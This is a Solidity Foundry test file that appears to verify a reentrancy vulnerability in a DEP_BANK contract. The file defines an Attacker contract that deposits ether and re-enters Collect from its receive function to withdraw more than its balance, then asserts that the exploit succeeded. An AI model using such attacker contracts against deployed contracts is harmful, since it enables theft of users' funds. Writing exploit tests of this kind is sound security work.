
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {DEP_BANK, LogFile} from "../src/DEP_BANK.sol";

contract TestReentrancyDEP_BANK is Test {
    DEP_BANK public _contractUnderTest;
    LogFile public _logFile;
    Attacker public _attacker;

    function setUp() public {
        _logFile = new LogFile();
        _contractUnderTest = new DEP_BANK();
        _contractUnderTest.SetLogFile(address(_logFile));
        _contractUnderTest.SetMinSum(0);
        _contractUnderTest.Initialized();
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0.01 ether && attackVal < type(uint128).max);

        // Fund the Victim contract with extra ETH so it has funds to be drained
        vm.deal(address(_contractUnderTest), attackVal * 3);
        
        // Fund the Attacker contract
        vm.deal(address(_attacker), attackVal * 2);

        // Fund the Test Contract
        vm.deal(address(this), attackVal * 2);

        // Setup the attack - attacker deposits funds into the victim contract
        _attacker.setupAttack{value: attackVal}(attackVal);
        
        // Execute the attack
        _attacker.attack(attackVal);

        // Verify the exploit succeeded
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    DEP_BANK public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = DEP_BANK(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        
        // Deposit funds into the victim contract to establish a balance
        _victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        // Capture Initial State - balance before the attack
        initialSnapshot = address(this).balance;

        // Store the value for the re-entrant call
        storedAttackVal = val;

        // Call the vulnerable Collect function
        _victim.Collect(val);

        // Verify Success Conditions - if we called Collect multiple times via reentrancy
        if (attackCallCount > 1) {
            exploitSucceeded = true;
        }
        
        // Also check if we received more ETH than we should have
        if (address(this).balance > initialSnapshot + storedAttackVal) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        attackCallCount++;
        if (attackCallCount < 2) {
            // Re-enter the Collect function before state is updated
            _victim.Collect(storedAttackVal);
        }
    }
}
